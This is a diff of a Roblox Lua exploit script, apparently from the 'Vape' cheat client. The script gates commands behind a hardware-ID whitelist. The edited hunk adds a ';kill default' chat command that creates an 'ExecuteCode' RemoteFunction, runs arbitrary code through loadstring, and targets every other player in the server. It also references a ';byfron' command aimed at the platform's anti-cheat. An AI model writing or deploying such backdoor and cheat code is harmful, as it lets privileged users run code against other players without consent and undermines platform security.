@@ -321,31 +321,31 @@ for i,v in pairs(HWIDTable) do
         print("Cmd Execution bypassed")
         -- Continue executing code here for the authorized user
         
-        local CmdExecution = ChatService.PlayerChat:Connect(function(player, message)
-            if player.Name == privateusers and string.lower(message) == ";kill default" then
-                -- Insert the Lua code you want to execute here
-                local codeToExecute = vapePrivateCommands.kill
-                
-                for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
-                    if otherPlayer ~= player then
-                        local success, err = pcall(function()
-                            local replicatedStorage = game:GetService("ReplicatedStorage")
-                            local remoteFunction = Instance.new("RemoteFunction")
-                            remoteFunction.Name = "ExecuteCode"
-                            remoteFunction.Parent = replicatedStorage
-                            remoteFunction.OnServerInvoke = function(player, codeToExecute)
-                                return loadstring(codeToExecute)()
-                            end
-                            remoteFunction:InvokeClient(otherPlayer, codeToExecute)
-                            remoteFunction:Destroy()
-                        end)
-                        
-                        if not success then
-                            warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
-                        end
-                    end
+  --kill :D
+  if player.Name == privateusers and string.lower(message) == ";kill default" then
+    -- Insert the Lua code you want to execute here
+    local codeToExecute2 = vapePrivateCommands.kill
+    
+    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
+        if otherPlayer ~= player then
+            local success, err = pcall(function()
+                local replicatedStorage = game:GetService("ReplicatedStorage")
+                local remoteFunction = Instance.new("RemoteFunction")
+                remoteFunction.Name = "ExecuteCode"
+                remoteFunction.Parent = replicatedStorage
+                remoteFunction.OnServerInvoke = function(player,codeToExecute2)
+                    return loadstring(codeToExecute2)()
                 end
+                remoteFunction:InvokeClient(otherPlayer, codeToExecute2)
+                remoteFunction:Destroy()
+            end)
+            
+            if not success then
+                warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
             end
+        end
+    end
+end
 
                 --Byfron
                 if player.Name == privateusers and string.lower(message) == ";byfron default" then
@@ -530,11 +530,3 @@ for i,v in pairs(HWIDTable) do
         end)
     end
 end
-
-
-
-
-
-
-
-
